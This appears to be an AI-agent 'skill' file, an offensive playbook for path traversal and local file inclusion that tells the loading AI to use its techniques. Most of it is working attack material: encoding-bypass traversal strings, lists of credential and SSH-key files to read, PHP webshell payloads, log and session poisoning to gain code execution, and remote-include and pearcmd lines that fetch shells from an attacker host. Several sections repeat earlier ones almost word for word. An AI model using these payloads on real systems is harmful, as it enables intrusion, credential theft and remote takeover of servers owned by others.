---
name: path-traversal-lfi
description: >-
  Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.
---

# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Base models miss encoding chains and RCE escalation paths.

## 0. RELATED ROUTING

Before deep exploitation, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when the primary attack surface is an upload workflow rather than an include or read primitive
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the target is a **Java backend** (Spring, Jetty, Undertow, Vert.x) and standard `../`, `%2e%2e`, `%252e` chains are WAF-blocked — Ghost Bits substitutes `.` with `阮` (U+962E) and `/` with `阯` (U+962F), re-enabling traversal through Spring CVE-2025-41242 and Jetty `%2>` hex-folding

### First-pass traversal chains

```text
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\\..\\..\\windows\\win.ini
```

---

## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

---

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```

---

## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning (most reliable when log is accessible)
**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**Step 2**: Include the log file via LFI:
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning
Inject PHP payload as SSH username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then include `/var/log/auth.log`.

### PHP Session File Poisoning
**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
**Step 2**: Include session file:
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
Find session ID from cookie `PHPSESSID`.

### PHP Wrappers for RCE

**`php://expect` wrapper** (requires `expect` PHP extension):
```
?page=expect://id
```

**`php://input` wrapper** (combine LFI with POST body):
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` wrapper** (inject PHP directly as base64):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---

## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---

## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---

## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---

## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---

## 11. LFI TO RCE ESCALATION PATHS

| Method | Requirements | Payload |
|---|---|---|
| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |

---

## 12. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (most powerful, always try first)

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/resource=index.php
```

**Filter chain RCE** (synacktiv php_filter_chain_generator):

- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`

**convert.iconv + dechunk oracle** (blind file read):

- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
- Enables blind LFI to read file contents character by character

### php://input

```text
POST vulnerable.php?page=php://input
Body: <?php system('id'); ?>
```

Requires `allow_url_include=On`

### data://

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
```

### phar://

```text
phar://uploaded.phar/test.php
```

Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)

### zip://

```text
zip://uploaded.zip%23shell.php
```

### expect://

```text
expect://id
```

Requires `expect` extension (rare)

---

## 13. PEARCMD LFI EXPLOITATION

When `pearcmd.php` is accessible via LFI (common in Docker PHP images):

| Method | Payload |
|---|---|
| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |

---

## 14. WINDOWS-SPECIFIC LFI TECHNIQUES

**FindFirstFile wildcard** (Windows only):

- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
- `php<<` can match `php5`, `phtml`, etc.
- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`

---

## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)

Based on vulnerability research statistical analysis:

| Parameter Name | Frequency | Context |
|---|---|---|
| `filename`, `file`, `path` | Very High | Direct file operations |
| `page`, `include`, `template` | High | Template/page inclusion |
| `url`, `src`, `href` | High | Resource loading |
| `download`, `read`, `load` | Medium | File download/read |
| `dir`, `folder`, `root` | Medium | Directory operations |
| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |

High-frequency vulnerable endpoints:

`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`

---

## 16. LFI TO RCE — ESCALATION PATHS

### 1. /proc/self/fd Brute-Force
```
# When file upload exists but path is unknown:
# Uploaded files get temporary fd in /proc/self/fd/
# Brute-force fd numbers:
/proc/self/fd/0 through /proc/self/fd/255
# Include the temp file before it's cleaned up
```

### 2. /proc/self/environ Poisoning
```
# If User-Agent is reflected in process environment:
GET /vuln.php?page=/proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
```

### 3. Log Poisoning
```
# Apache access log:
GET /<?php system($_GET['c']); ?> HTTP/1.1
# Then include: /var/log/apache2/access.log

# SSH auth log (username field):
ssh '<?php system($_GET["c"]); ?>'@target
# Then include: /var/log/auth.log

# Mail log (SMTP subject):
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: <?php system($_GET['c']); ?>
.
# Then include: /var/log/mail.log
```

### 4. PHP Session File Poisoning
```
# Set session variable to PHP code:
GET /page.php?lang=<?php system($_GET['c']); ?>
# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
# Include the session file
```

### 5. phpinfo() Assisted LFI
```
# Race condition: upload via phpinfo() temp file
# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
# 2. Include the temp file before PHP cleans it up
# Requires many concurrent requests (race window ~10ms)
```

### 6. iconv CVE-2024-2961
```
# glibc iconv buffer overflow in PHP filter chains
# Tool: cfreal/cnext-exploits
# Converts LFI to RCE without needing writable paths or log poisoning
```

---

## 17. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (file read without execution)
```
# Base64 encode source code:
php://filter/convert.base64-encode/resource=index.php

# ROT13:
php://filter/read=string.rot13/resource=index.php

# Chain multiple filters:
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Zlib compression:
php://filter/zlib.deflate/resource=index.php

# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
# Generates chains that write arbitrary content via iconv conversions
# Tool: synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

### convert.iconv + dechunk Oracle (blind file read)
```
# Error-based oracle: determine if first byte of file matches a character
# Tool: synacktiv/php_filter_chains_oracle_exploit
# Reads files byte-by-byte through error/behavior differences
```

### data:// Wrapper
```
# Execute arbitrary PHP:
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Bypass when data:// is filtered but data: (without //) works:
data:text/plain,<?php system('id'); ?>
```

### expect:// Wrapper
```
expect://id
expect://ls
# Requires expect extension (rare but check)
```

### php://input
```
POST /vuln.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### zip:// and phar:// Wrappers
```
# zip://: Upload ZIP containing PHP file
zip:///tmp/upload.zip#shell.php

# phar://: Triggers deserialization of phar metadata!
phar:///tmp/upload.phar/anything
# Create malicious phar with crafted metadata object
# Can chain to RCE via POP gadget chains (like PHP deserialization)
# Phar can be disguised as JPG (polyglot phar-jpg)
```

### wrapwrap (prefix/suffix injection)
```
# Tool: ambionics/wrapwrap
# Adds arbitrary prefix and suffix to file content via filter chains
# Useful for converting file read into XXE, SSRF, or deserialization trigger
```

---

## 18. PEARCMD LFI TO RCE

When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):

```
# Method 1: config-create (write arbitrary content to file)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# Method 2: man_dir (change docs directory to write path)
GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php

# Method 3: download (fetch remote file)
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php

# Method 4: install (install remote package)
GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
```

### Windows FindFirstFile Wildcard
```
# Windows << and > wildcards in file paths:
# << matches any extension, > matches single char
include("php<<");      # Matches any .php* file
include("shel>");      # Matches shell.php if only 1 char follows
# Useful when exact filename is unknown
```

---

## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS

### Common Vulnerable Parameter Names
```
filename    filepath    path        file        url
template    page        include     dir         document
folder      root        pg          lang        doc
conf        data        content     name        src
inputFile   hdfile      XFileName   FileUrl     readfile
```

### High-Frequency Vulnerable Endpoints
| Endpoint Pattern | Frequency |
|---|---|
| `down.php` / `download.php` | Very High |
| `download.jsp` / `download.do` | Very High |
| `download.asp` / `download.aspx` | High |
| `readfile.php` / `file.php` | High |
| `export` / `report` endpoints | Medium |
| `template` / `preview` endpoints | Medium |

### Bypass Technique Distribution (from field research)
| Technique | Prevalence |
|---|---|
| Absolute path direct access | Most common |
| WEB-INF/web.xml read (Java) | Common |
| Base64 encoded path parameter | Moderate |
| Double URL encoding | Moderate |
| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |

---

## 20. JAVA / SPRING PATH TRAVERSAL

### Spring Resource Loading

```java
// Vulnerable patterns — user input flows into resource path
ClassPathResource r = new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
# Read WEB-INF deployment descriptor
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml

# Spring Boot specific
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
```

### High-value Java targets

```text
/WEB-INF/web.xml                        ← servlet mappings, filter chains, security constraints
/WEB-INF/classes/application.properties  ← DB creds, API keys, Spring config
/WEB-INF/classes/application.yml         ← same, YAML format
/WEB-INF/lib/                            ← application JARs (download for decompilation)
/META-INF/MANIFEST.MF                    ← build metadata, main class
/META-INF/context.xml                    ← Tomcat datasource definitions
```

### Spring MVC `ResourceHttpRequestHandler`

When static resources are served via `spring.resources.static-locations`:
```text
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml       ← Tomcat path parameter normalization
```

---

## 21. TOMCAT-SPECIFIC TRICKS

### Path Parameter Normalization (`/..;/`)

Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:

```text
GET /app/..;/manager/html           ← Tomcat resolves to /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
```

**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up.

### AJP Ghostcat (CVE-2020-1938)

Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:

```text
# Read any file through AJP
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

# Include attacker-controlled file as JSP for execution
python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31.

### Tomcat double-URL-decode

```text
GET /%252e%252e/%252e%252e/etc/passwd
```

---

## 22. NGINX ALIAS MISCONFIGURATION

### The trailing-slash trap

```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /data/;
}
```

Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

**Correct configuration**:
```nginx
location /assets/ {
    alias /data/;
}
```

### Off-by-one in `location` + `alias`

```nginx
location /img {
    alias /var/images;
}
# /img../secret -> /var/images/../secret -> /var/secret
```

Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does.

---

## 23. NODE.JS PATH MODULE QUIRKS

### `path.join()` with URL-encoded input

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL-decodes `req.params` before `path.join`:

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (already decoded)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` quirks

- Calls `decodeURIComponent` on the path, then `path.normalize()`
- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again
- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate

### `url.parse()` vs `new URL()` confusion

```javascript
// Legacy: url.parse() does NOT resolve path traversal
const parsed = require('url').parse(userInput);
// parsed.pathname may contain ../

// Modern: new URL() normalizes the path
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname has ../ resolved
```

Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized.

---

## 24. IIS SHORT FILENAME ENUMERATION (~1 TILDE TRICK)

### Concept

Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes.

### Detection method

```text
GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)
GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)
```

Differential response leaks whether a file starting with that prefix exists.

### Enumeration process

```text
Step 1: /A~1* -> 404 = file starting with A exists
Step 2: /AB~1* -> 404 = file starting with AB exists
Step 3: /ABCDEF~1.A* -> 404 = extension starts with A
```

### Tools

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

### Impact

- Discover hidden backups, config files, source code
- Shorter brute-force space: 8.3 format limits character set
- Works even when directory listing is disabled
